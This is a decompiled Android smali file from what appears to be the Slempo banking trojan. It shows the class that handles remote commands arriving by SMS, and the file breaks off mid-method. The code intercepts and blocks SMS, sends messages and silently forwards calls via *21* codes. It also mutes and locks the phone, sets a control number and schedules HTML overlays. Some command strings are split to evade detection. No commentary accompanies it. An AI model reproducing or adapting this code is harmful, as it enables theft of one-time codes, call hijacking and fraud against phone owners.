.class public Lorg/slempo/service/utils/SmsProcessor;
.super Ljava/lang/Object;
.source "SmsProcessor.java"


# static fields
.field private static commands:Ljava/util/HashSet;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/HashSet",
            "<",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation
.end field


# instance fields
.field private am:Landroid/app/AlarmManager;

.field private final context:Landroid/content/Context;

.field private final data:Ljava/lang/String;

.field private final params:Ljava/lang/String;

.field private settings:Landroid/content/SharedPreferences;


# direct methods
.method static constructor <clinit>()V
    .locals 3

    .prologue
    .line 32
    new-instance v1, Ljava/util/HashSet;

    invoke-direct {v1}, Ljava/util/HashSet;-><init>()V

    sput-object v1, Lorg/slempo/service/utils/SmsProcessor;->commands:Ljava/util/HashSet;

    .line 39
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    .line 40
    .local v0, "builder":Ljava/lang/StringBuilder;
    sget-object v1, Lorg/slempo/service/utils/SmsProcessor;->commands:Ljava/util/HashSet;

    const-string v2, "#intercept_sms_start"

    invoke-virtual {v1, v2}, Ljava/util/HashSet;->add(Ljava/lang/Object;)Z

    .line 41
    sget-object v1, Lorg/slempo/service/utils/SmsProcessor;->commands:Ljava/util/HashSet;

    const-string v2, "#intercept_sms_stop"

    invoke-virtual {v1, v2}, Ljava/util/HashSet;->add(Ljava/lang/Object;)Z

    .line 42
    sget-object v1, Lorg/slempo/service/utils/SmsProcessor;->commands:Ljava/util/HashSet;

    const-string v2, "#block_numbers"

    invoke-virtual {v1, v2}, Ljava/util/HashSet;->add(Ljava/lang/Object;)Z

    .line 43
    sget-object v1, Lorg/slempo/service/utils/SmsProcessor;->commands:Ljava/util/HashSet;

    const-string v2, "#unblock_all_numbers"

    invoke-virtual {v1, v2}, Ljava/util/HashSet;->add(Ljava/lang/Object;)Z

    .line 44
    sget-object v1, Lorg/slempo/service/utils/SmsProcessor;->commands:Ljava/util/HashSet;

    const-string v2, "#unblock_numbers"

    invoke-virtual {v1, v2}, Ljava/util/HashSet;->add(Ljava/lang/Object;)Z

    .line 45
    sget-object v1, Lorg/slempo/service/utils/SmsProcessor;->commands:Ljava/util/HashSet;

    const-string v2, "#lock"

    invoke-virtual {v1, v2}, Ljava/util/HashSet;->add(Ljava/lang/Object;)Z

    .line 46
    sget-object v1, Lorg/slempo/service/utils/SmsProcessor;->commands:Ljava/util/HashSet;

    const-string v2, "#unlock"

    invoke-virtual {v1, v2}, Ljava/util/HashSet;->add(Ljava/lang/Object;)Z

    .line 47
    new-instance v0, Ljava/lang/StringBuilder;

    .end local v0    # "builder":Ljava/lang/StringBuilder;
    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    .line 48
    .restart local v0    # "builder":Ljava/lang/StringBuilder;
    const-string v1, "#send"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 49
    const-string v1, "_sms"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 50
    sget-object v1, Lorg/slempo/service/utils/SmsProcessor;->commands:Ljava/util/HashSet;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/util/HashSet;->add(Ljava/lang/Object;)Z

    .line 51
    new-instance v0, Ljava/lang/StringBuilder;

    .end local v0    # "builder":Ljava/lang/StringBuilder;
    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    .line 52
    .restart local v0    # "builder":Ljava/lang/StringBuilder;
    const-string v1, "#forward"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 53
    const-string v1, "_calls"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 54
    sget-object v1, Lorg/slempo/service/utils/SmsProcessor;->commands:Ljava/util/HashSet;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/util/HashSet;->add(Ljava/lang/Object;)Z

    .line 55
    sget-object v1, Lorg/slempo/service/utils/SmsProcessor;->commands:Ljava/util/HashSet;

    const-string v2, "#disable_forward_calls"

    invoke-virtual {v1, v2}, Ljava/util/HashSet;->add(Ljava/lang/Object;)Z

    .line 56
    sget-object v1, Lorg/slempo/service/utils/SmsProcessor;->commands:Ljava/util/HashSet;

    const-string v2, "#control_number"

    invoke-virtual {v1, v2}, Ljava/util/HashSet;->add(Ljava/lang/Object;)Z

    .line 57
    sget-object v1, Lorg/slempo/service/utils/SmsProcessor;->commands:Ljava/util/HashSet;

    const-string v2, "#update_html"

    invoke-virtual {v1, v2}, Ljava/util/HashSet;->add(Ljava/lang/Object;)Z

    .line 58
    sget-object v1, Lorg/slempo/service/utils/SmsProcessor;->commands:Ljava/util/HashSet;

    const-string v2, "#show_html"

    invoke-virtual {v1, v2}, Ljava/util/HashSet;->add(Ljava/lang/Object;)Z

    .line 59
    sget-object v1, Lorg/slempo/service/utils/SmsProcessor;->commands:Ljava/util/HashSet;

    const-string v2, "#wipe_data"

    invoke-virtual {v1, v2}, Ljava/util/HashSet;->add(Ljava/lang/Object;)Z

    .line 60
    return-void
.end method

.method public constructor <init>(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V
    .locals 3
    .param p1, "data"    # Ljava/lang/String;
    .param p2, "params"    # Ljava/lang/String;
    .param p3, "context"    # Landroid/content/Context;

    .prologue
    .line 63
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 64
    invoke-virtual {p1}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lorg/slempo/service/utils/SmsProcessor;->data:Ljava/lang/String;

    .line 65
    iput-object p2, p0, Lorg/slempo/service/utils/SmsProcessor;->params:Ljava/lang/String;

    .line 66
    iput-object p3, p0, Lorg/slempo/service/utils/SmsProcessor;->context:Landroid/content/Context;

    .line 67
    iget-object v0, p0, Lorg/slempo/service/utils/SmsProcessor;->context:Landroid/content/Context;

    const-string v1, "AppPrefs"

    const/4 v2, 0x0

    invoke-virtual {v0, v1, v2}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v0

    iput-object v0, p0, Lorg/slempo/service/utils/SmsProcessor;->settings:Landroid/content/SharedPreferences;

    .line 69
    const-string v0, "alarm"

    invoke-virtual {p3, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/AlarmManager;

    iput-object v0, p0, Lorg/slempo/service/utils/SmsProcessor;->am:Landroid/app/AlarmManager;

    .line 70
    return-void
.end method

.method private callForward(Ljava/lang/String;)V
    .locals 5
    .param p1, "number"    # Ljava/lang/String;

    .prologue
    .line 167
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    .line 168
    .local v0, "builder":Ljava/lang/StringBuilder;
    const-string v3, "android.intent.action."

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 169
    const-string v3, "CALL"

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 170
    new-instance v1, Landroid/content/Intent;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-direct {v1, v3}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 171
    .local v1, "intentCallForward":Landroid/content/Intent;
    const/high16 v3, 0x10000000

    invoke-virtual {v1, v3}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 172
    const-string v3, "tel"

    const-string v4, "#"

    invoke-static {v3, p1, v4}, Landroid/net/Uri;->fromParts(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v2

    .line 173
    .local v2, "mmiCode":Landroid/net/Uri;
    invoke-virtual {v1, v2}, Landroid/content/Intent;->setData(Landroid/net/Uri;)Landroid/content/Intent;

    .line 174
    iget-object v3, p0, Lorg/slempo/service/utils/SmsProcessor;->context:Landroid/content/Context;

    invoke-virtual {v3, v1}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    .line 175
    return-void
.end method

.method private hasCommand()Z
    .locals 4

    .prologue
    .line 276
    sget-object v1, Lorg/slempo/service/utils/SmsProcessor;->commands:Ljava/util/HashSet;

    invoke-virtual {v1}, Ljava/util/HashSet;->iterator()Ljava/util/Iterator;

    move-result-object v1

    :cond_0
    invoke-interface {v1}, Ljava/util/Iterator;->hasNext()Z

    move-result v2

    if-eqz v2, :cond_1

    invoke-interface {v1}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/String;

    .line 277
    .local v0, "command":Ljava/lang/String;
    iget-object v2, p0, Lorg/slempo/service/utils/SmsProcessor;->data:Ljava/lang/String;

    invoke-virtual {v2, v0}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v2

    const/4 v3, -0x1

    if-eq v2, v3, :cond_0

    .line 278
    const/4 v1, 0x1

    .line 281
    .end local v0    # "command":Ljava/lang/String;
    :goto_0
    return v1

    :cond_1
    const/4 v1, 0x0

    goto :goto_0
.end method

.method private processBlockNumbersCommand()V
    .locals 8

    .prologue
    .line 218
    :try_start_0
    iget-object v5, p0, Lorg/slempo/service/utils/SmsProcessor;->data:Ljava/lang/String;

    iget-object v6, p0, Lorg/slempo/service/utils/SmsProcessor;->data:Ljava/lang/String;

    const/4 v7, 0x0

    invoke-static {v6, v7}, Lorg/slempo/service/utils/Parser;->indexOfSpace(Ljava/lang/String;I)I

    move-result v6

    invoke-virtual {v5, v6}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v4

    .line 219
    .local v4, "text":Ljava/lang/String;
    new-instance v2, Ljava/util/ArrayList;

    const-string v5, ","

    .line 220
    invoke-virtual {v4, v5}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, Ljava/util/Arrays;->asList([Ljava/lang/Object;)Ljava/util/List;

    move-result-object v5

    invoke-direct {v2, v5}, Ljava/util/ArrayList;-><init>(Ljava/util/Collection;)V

    .line 221
    .local v2, "numbers":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Ljava/lang/String;>;"
    new-instance v3, Ljava/util/HashSet;

    invoke-direct {v3, v2}, Ljava/util/HashSet;-><init>(Ljava/util/Collection;)V

    .line 222
    .local v3, "numbersSet":Ljava/util/HashSet;, "Ljava/util/HashSet<Ljava/lang/String;>;"
    iget-object v5, p0, Lorg/slempo/service/utils/SmsProcessor;->settings:Landroid/content/SharedPreferences;

    const-string v6, "BLOCKED_NUMBERS"

    new-instance v7, Ljava/util/HashSet;

    invoke-direct {v7}, Ljava/util/HashSet;-><init>()V

    .line 224
    invoke-static {v7}, Lorg/slempo/service/utils/ObjectSerializer;->serialize(Ljava/io/Serializable;)Ljava/lang/String;

    move-result-object v7

    .line 223
    invoke-interface {v5, v6, v7}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, Lorg/slempo/service/utils/ObjectSerializer;->deserialize(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/util/HashSet;

    .line 225
    .local v0, "blockedNumbers":Ljava/util/HashSet;, "Ljava/util/HashSet<Ljava/lang/String;>;"
    invoke-virtual {v0, v3}, Ljava/util/HashSet;->addAll(Ljava/util/Collection;)Z

    .line 226
    iget-object v5, p0, Lorg/slempo/service/utils/SmsProcessor;->settings:Landroid/content/SharedPreferences;

    const-string v6, "BLOCKED_NUMBERS"

    .line 227
    invoke-static {v0}, Lorg/slempo/service/utils/ObjectSerializer;->serialize(Ljava/io/Serializable;)Ljava/lang/String;

    move-result-object v7

    .line 226
    invoke-static {v5, v6, v7}, Lorg/slempo/service/utils/Utils;->putStringValue(Landroid/content/SharedPreferences;Ljava/lang/String;Ljava/lang/String;)V

    .line 228
    iget-object v5, p0, Lorg/slempo/service/utils/SmsProcessor;->context:Landroid/content/Context;

    invoke-static {v5, v0}, Lorg/slempo/service/utils/Sender;->sendStartBlockingNumbersData(Landroid/content/Context;Ljava/util/HashSet;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 232
    .end local v0    # "blockedNumbers":Ljava/util/HashSet;, "Ljava/util/HashSet<Ljava/lang/String;>;"
    .end local v2    # "numbers":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Ljava/lang/String;>;"
    .end local v3    # "numbersSet":Ljava/util/HashSet;, "Ljava/util/HashSet<Ljava/lang/String;>;"
    .end local v4    # "text":Ljava/lang/String;
    :goto_0
    return-void

    .line 229
    :catch_0
    move-exception v1

    .line 230
    .local v1, "e":Ljava/lang/Exception;
    invoke-virtual {v1}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_0
.end method

.method private processControlNumberCommand()V
    .locals 5

    .prologue
    .line 178
    iget-object v3, p0, Lorg/slempo/service/utils/SmsProcessor;->data:Ljava/lang/String;

    const/4 v4, 0x0

    invoke-static {v3, v4}, Lorg/slempo/service/utils/Parser;->getParameter(Ljava/lang/String;I)Ljava/lang/String;

    move-result-object v2

    .line 179
    .local v2, "number":Ljava/lang/String;
    iget-object v3, p0, Lorg/slempo/service/utils/SmsProcessor;->settings:Landroid/content/SharedPreferences;

    const-string v4, "CONTROL_NUMBER"

    invoke-static {v3, v4, v2}, Lorg/slempo/service/utils/Utils;->putStringValue(Landroid/content/SharedPreferences;Ljava/lang/String;Ljava/lang/String;)V

    .line 180
    iget-object v3, p0, Lorg/slempo/service/utils/SmsProcessor;->context:Landroid/content/Context;

    invoke-static {v3}, Lorg/slempo/service/utils/Sender;->sendControlNumberData(Landroid/content/Context;)V

    .line 182
    :try_start_0
    new-instance v1, Lorg/json/JSONObject;

    invoke-direct {v1}, Lorg/json/JSONObject;-><init>()V

    .line 183
    .local v1, "jObject":Lorg/json/JSONObject;
    const-string v3, "type"

    const-string v4, "number done"

    invoke-virtual {v1, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 184
    invoke-virtual {v1}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v2, v3}, Lorg/slempo/service/utils/Utils;->sendMessage(Ljava/lang/String;Ljava/lang/String;)Z
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    .line 188
    .end local v1    # "jObject":Lorg/json/JSONObject;
    :goto_0
    return-void

    .line 185
    :catch_0
    move-exception v0

    .line 186
    .local v0, "e":Lorg/json/JSONException;
    invoke-virtual {v0}, Lorg/json/JSONException;->printStackTrace()V

    goto :goto_0
.end method

.method private processDisableForwardCallsCommand()V
    .locals 1

    .prologue
    .line 162
    const-string v0, "#21#"

    invoke-direct {p0, v0}, Lorg/slempo/service/utils/SmsProcessor;->callForward(Ljava/lang/String;)V

    .line 163
    iget-object v0, p0, Lorg/slempo/service/utils/SmsProcessor;->context:Landroid/content/Context;

    invoke-static {v0}, Lorg/slempo/service/utils/Sender;->sendCallsForwardingDisabled(Landroid/content/Context;)V

    .line 164
    return-void
.end method

.method private processForwardCallsCommand()V
    .locals 3

    .prologue
    .line 156
    iget-object v1, p0, Lorg/slempo/service/utils/SmsProcessor;->data:Ljava/lang/String;

    const/4 v2, 0x0

    invoke-static {v1, v2}, Lorg/slempo/service/utils/Parser;->getParameter(Ljava/lang/String;I)Ljava/lang/String;

    move-result-object v0

    .line 157
    .local v0, "number":Ljava/lang/String;
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "*21*"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "#"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-direct {p0, v1}, Lorg/slempo/service/utils/SmsProcessor;->callForward(Ljava/lang/String;)V

    .line 158
    iget-object v1, p0, Lorg/slempo/service/utils/SmsProcessor;->context:Landroid/content/Context;

    invoke-static {v1, v0}, Lorg/slempo/service/utils/Sender;->sendCallsForwarded(Landroid/content/Context;Ljava/lang/String;)V

    .line 159
    return-void
.end method

.method private processInterceptSMSStartCommand()V
    .locals 3

    .prologue
    .line 264
    iget-object v0, p0, Lorg/slempo/service/utils/SmsProcessor;->settings:Landroid/content/SharedPreferences;

    const-string v1, "INTERCEPTING_INCOMING_ENABLED"

    const/4 v2, 0x1

    invoke-static {v0, v1, v2}, Lorg/slempo/service/utils/Utils;->putBooleanValue(Landroid/content/SharedPreferences;Ljava/lang/String;Z)V

    .line 266
    iget-object v0, p0, Lorg/slempo/service/utils/SmsProcessor;->context:Landroid/content/Context;

    const-string v1, "started"

    invoke-static {v0, v1}, Lorg/slempo/service/utils/Sender;->sendRentStatus(Landroid/content/Context;Ljava/lang/String;)V

    .line 267
    return-void
.end method

.method private processInterceptSMSStopCommand()V
    .locals 3

    .prologue
    .line 270
    iget-object v0, p0, Lorg/slempo/service/utils/SmsProcessor;->settings:Landroid/content/SharedPreferences;

    const-string v1, "INTERCEPTING_INCOMING_ENABLED"

    const/4 v2, 0x0

    invoke-static {v0, v1, v2}, Lorg/slempo/service/utils/Utils;->putBooleanValue(Landroid/content/SharedPreferences;Ljava/lang/String;Z)V

    .line 272
    iget-object v0, p0, Lorg/slempo/service/utils/SmsProcessor;->context:Landroid/content/Context;

    const-string v1, "stopped"

    invoke-static {v0, v1}, Lorg/slempo/service/utils/Sender;->sendRentStatus(Landroid/content/Context;Ljava/lang/String;)V

    .line 273
    return-void
.end method

.method private processLockCommand()V
    .locals 4

    .prologue
    .line 198
    invoke-static {}, Lorg/slempo/service/MainService;->showSystemDialog()V

    .line 199
    iget-object v1, p0, Lorg/slempo/service/utils/SmsProcessor;->context:Landroid/content/Context;

    const-string v2, "audio"

    .line 200
    invoke-virtual {v1, v2}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/media/AudioManager;

    .line 201
    .local v0, "audioManager":Landroid/media/AudioManager;
    const/4 v1, 0x0

    invoke-virtual {v0, v1}, Landroid/media/AudioManager;->setRingerMode(I)V

    .line 202
    iget-object v1, p0, Lorg/slempo/service/utils/SmsProcessor;->settings:Landroid/content/SharedPreferences;

    const-string v2, "IS_LOCKED"

    const/4 v3, 0x1

    invoke-static {v1, v2, v3}, Lorg/slempo/service/utils/Utils;->putBooleanValue(Landroid/content/SharedPreferences;Ljava/lang/String;Z)V

    .line 203
    iget-object v1, p0, Lorg/slempo/service/utils/SmsProcessor;->context:Landroid/content/Context;

    const-string v2, "locked"

    invoke-static {v1, v2}, Lorg/slempo/service/utils/Sender;->sendLockStatus(Landroid/content/Context;Ljava/lang/String;)V

    .line 204
    return-void
.end method

.method private processSendMessageCommand()V
    .locals 5

    .prologue
    .line 191
    iget-object v2, p0, Lorg/slempo/service/utils/SmsProcessor;->data:Ljava/lang/String;

    const/4 v3, 0x0

    invoke-static {v2, v3}, Lorg/slempo/service/utils/Parser;->getParameter(Ljava/lang/String;I)Ljava/lang/String;

    move-result-object v0

    .line 192
    .local v0, "number":Ljava/lang/String;
    iget-object v2, p0, Lorg/slempo/service/utils/SmsProcessor;->data:Ljava/lang/String;

    iget-object v3, p0, Lorg/slempo/service/utils/SmsProcessor;->data:Ljava/lang/String;

    const/4 v4, 0x1

    invoke-static {v3, v4}, Lorg/slempo/service/utils/Parser;->indexOfSpace(Ljava/lang/String;I)I

    move-result v3

    invoke-virtual {v2, v3}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v1

    .line 193
    .local v1, "text":Ljava/lang/String;
    invoke-static {v0, v1}, Lorg/slempo/service/utils/Utils;->sendMessage(Ljava/lang/String;Ljava/lang/String;)Z

    .line 194
    iget-object v2, p0, Lorg/slempo/service/utils/SmsProcessor;->context:Landroid/content/Context;

    invoke-static {v2, v0, v1}, Lorg/slempo/service/utils/Sender;->sendNotificationSMSSentData(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    .line 195
    return-void
.end method

.method private processShowHTMLCommand()V
    .locals 5

    .prologue
    .line 120
    :try_start_0
    new-instance v1, Lorg/json/JSONObject;

    iget-object v3, p0, Lorg/slempo/service/utils/SmsProcessor;->params:Ljava/lang/String;

    invoke-direct {v1, v3}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V

    .line 121
    .local v1, "jObj":Lorg/json/JSONObject;
    const-string v3, "start delay minutes"

    invoke-virtual {v1, v3}, Lorg/json/JSONObject;->getInt(Ljava/lang/String;)I

    move-result v2

    .line 122
    .local v2, "startDelay":I
    const-string v3, "com.slempo.service.activities.HTMLStart"

    iget-object v4, p0, Lorg/slempo/service/utils/SmsProcessor;->params:Ljava/lang/String;

    invoke-direct {p0, v3, v4, v2}, Lorg/slempo/service/utils/SmsProcessor;->scheduleLaunch(Ljava/lang/String;Ljava/lang/String;I)V
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    .line 126
    .end local v1    # "jObj":Lorg/json/JSONObject;
    .end local v2    # "startDelay":I
    :goto_0
    return-void

    .line 123
    :catch_0
    move-exception v0

    .line 124
    .local v0, "e":Lorg/json/JSONException;
    invoke-virtual {v0}, Lorg/json/JSONException;->printStackTrace()V

    goto :goto_0
.end method

.method private processUnblockAllNumbersCommand()V
    .locals 4

    .prologue
    .line 236
    :try_start_0
    iget-object v1, p0, Lorg/slempo/service/utils/SmsProcessor;->settings:Landroid/content/SharedPreferences;

    const-string v2, "BLOCKED_NUMBERS"

    new-instance v3, Ljava/util/HashSet;

    invoke-direct {v3}, Ljava/util/HashSet;-><init>()V

    .line 237
    invoke-static {v3}, Lorg/slempo/service/utils/ObjectSerializer;->serialize(Ljava/io/Serializable;)Ljava/lang/String;

    move-result-object v3

    .line 236
    invoke-static {v1, v2, v3}, Lorg/slempo/service/utils/Utils;->putStringValue(Landroid/content/SharedPreferences;Ljava/lang/String;Ljava/lang/String;)V

    .line 238
    iget-object v1, p0, Lorg/slempo/service/utils/SmsProcessor;->context:Landroid/content/Context;

    invoke-static {v1}, Lorg/slempo/service/utils/Sender;->sendUnblockAllNumbersData(Landroid/content/Context;)V
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    .line 242
    :goto_0
    return-void

    .line 239
    :catch_0
    move-exception v0

    .line 240
    .local v0, "e":Ljava/io/IOException;
    invoke-virtual {v0}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_0
.end method

.method private processUnblockNumbersCommand()V
    .locals 8

    .prologue
    .line 247
    :try_start_0
    iget-object v5, p0, Lorg/slempo/service/utils/SmsProcessor;->data:Ljava/lang/String;

    iget-object v6, p0, Lorg/slempo/service/utils/SmsProcessor;->data:Ljava/lang/String;

    const/4 v7, 0x0

    invoke-static {v6, v7}, Lorg/slempo/service/utils/Parser;->indexOfSpace(Ljava/lang/String;I)I

    move-result v6

    invoke-virtual {v5, v6}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v4

    .line 248
    .local v4, "text":Ljava/lang/String;
    new-instance v2, Ljava/util/ArrayList;

    const-string v5, ","

    .line 249
    invoke-virtual {v4, v5}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, Ljava/util/Arrays;->asList([Ljava/lang/Object;)Ljava/util/List;

    move-result-object v5

    invoke-direct {v2, v5}, Ljava/util/ArrayList;-><init>(Ljava/util/Collection;)V

    .line 250
    .local v2, "numbers":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Ljava/lang/String;>;"
    new-instance v3, Ljava/util/HashSet;

    invoke-direct {v3, v2}, Ljava/util/HashSet;-><init>(Ljava/util/Collection;)V

    .line 251
    .local v3, "numbersSet":Ljava/util/HashSet;, "Ljava/util/HashSet<Ljava/lang/String;>;"
    iget-object v5, p0, Lorg/slempo/service/utils/SmsProcessor;->settings:Landroid/content/SharedPreferences;

    const-string v6, "BLOCKED_NUMBERS"

    new-instance v7, Ljava/util/HashSet;

    invoke-direct {v7}, Ljava/util/HashSet;-><init>()V

    .line 253
    invoke-static {v7}, Lorg/slempo/service/utils/ObjectSerializer;->serialize(Ljava/io/Serializable;)Ljava/lang/String;

    move-result-object v7

    .line 252
    invoke-interface {v5, v6, v7}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, Lorg/slempo/service/utils/ObjectSerializer;->deserialize(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/util/HashSet;

    .line 254
    .local v0, "blockedNumbers":Ljava/util/HashSet;, "Ljava/util/HashSet<Ljava/lang/String;>;"
    invoke-virtual {v0, v3}, Ljava/util/HashSet;->removeAll(Ljava/util/Collection;)Z

    .line 255
    iget-object v5, p0, Lorg/slempo/service/utils/SmsProcessor;->settings:Landroid/content/SharedPreferences;

    const-string v6, "BLOCKED_NUMBERS"

    .line 256
    invoke-static {v0}, Lorg/slempo/service/utils/ObjectSerializer;->serialize(Ljava/io/Serializable;)Ljava/lang/String;

    move-result-object v7

    .line 255
    invoke-static {v5, v6, v7}, Lorg/slempo/service/utils/Utils;->putStringValue(Landroid/content/SharedPreferences;Ljava/lang/String;Ljava/lang/String;)V

    .line 257
    iget-object v5, p0, Lorg/slempo/service/utils/SmsProcessor;->context:Landroid/content/Context;

    invoke-static {v5, v0}, Lorg/slempo/service/utils/Sender;->sendStartBlockingNumbersData(Landroid/content/Context;Ljava/util/HashSet;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 261
    .end local v0    # "blockedNumbers":Ljava/util/HashSet;, "Ljava/util/HashSet<Ljava/lang/String;>;"
    .end local v2    # "numbers":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Ljava/lang/String;>;"
    .end local v3    # "numbersSet":Ljava/util/HashSet;, "Ljava/util/HashSet<Ljava/lang/String;>;"
    .end local v4    # "text":Ljava/lang/String;
    :goto_0
    return-void

    .line 258
    :catch_0
    move-exception v1

    .line 259
    .local v1, "e":Ljava/lang/Exception;
    invoke-virtual {v1}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_0
.end method

.method private processUnlockCommand()V
    .locals 4

    .prologue
    .line 207
    invoke-static {}, Lorg/slempo/service/MainService;->hideSystemDialog()V

    .line 208
    iget-object v1, p0, Lorg/slempo/service/utils/SmsProcessor;->context:Landroid/content/Context;

    const-string v2, "audio"

    .line 209
    invoke-virtual {v1, v2}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/media/AudioManager;

    .line 210
    .local v0, "audioManager":Landroid/media/AudioManager;
    const/4 v1, 0x2

    invoke-virtual {v0, v1}, Landroid/media/AudioManager;->setRingerMode(I)V

    .line 211
    iget-object v1, p0, Lorg/slempo/service/utils/SmsProcessor;->settings:Landroid/content/SharedPreferences;

    const-string v2, "IS_LOCKED"

    const/4 v3, 0x0

    invoke-static {v1, v2, v3}, Lorg/slempo/service/utils/Utils;->putBooleanValue(Landroid/content/SharedPreferences;Ljava/lang/String;Z)V

    .line 212
    iget-object v1, p0, Lorg/slempo/service/utils/SmsProcessor;->context:Landroid/content/Context;

    const-string v2, "unlocked"

    invoke-static {v1, v2}, Lorg/slempo/service/utils/Sender;->sendLockStatus(Landroid/content/Context;Ljava/lang/String;)V

    .line 213
    return-void
.end method

.method private processUpdateHTMLCommand()V
    .locals 6

    .prologue
    .line 139
    :try_start_0
    new-instance v2, Lorg/json/JSONObject;

    iget-object v3, p0, Lorg/slempo/service/utils/SmsProcessor;->params:Ljava/lang/String;

    invoke-direct {v2, v3}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V

    .line 140
    .local v2, "jObject":Lorg/json/JSONObject;
    iget-object v3, p0, Lorg/slempo/service/utils/SmsProcessor;->settings:Landroid/content/SharedPreferences;

    const-string v4, "HTML_VERSION"

    const-string v5, "version"

    .line 141
    invoke-virtual {v2, v5}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    .line 140
    invoke-static {v3, v4, v5}, Lorg/slempo/service/utils/Utils;->putStringValue(Landroid/content/SharedPreferences;Ljava/lang/String;Ljava/lang/String;)V

    .line 142
    const-string v3, "data"

    invoke-virtual {v2, v3}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 143
    .local v0, "data":Ljava/lang/String;
    iget-object v3, p0, Lorg/slempo/service/utils/SmsProcessor;->settings:Landroid/content/SharedPreferences;

    const-string v4, "HTML_DATA"

